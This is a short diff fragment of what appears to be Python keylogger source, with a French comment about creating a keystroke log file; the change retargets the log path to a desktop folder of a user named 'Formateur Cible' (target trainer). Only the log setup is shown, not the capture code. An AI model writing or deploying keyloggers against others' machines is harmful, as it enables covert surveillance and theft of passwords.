@@ -4,7 +4,7 @@ from datetime import datetime
 
 # Création du fichier de logs contenant les frappes
 
-log_filename = f"C:\Users\Aurelien\Downloads\keylog_{datetime.now().strftime('%Y-%m-%d')}.txt"
+log_filename = f"C:\Users\Formateur Cible\Bureau\keylog_{datetime.now().strftime('%Y-%m-%d')}.txt"
 
 logging.basicConfig(
     filename=log_filename,
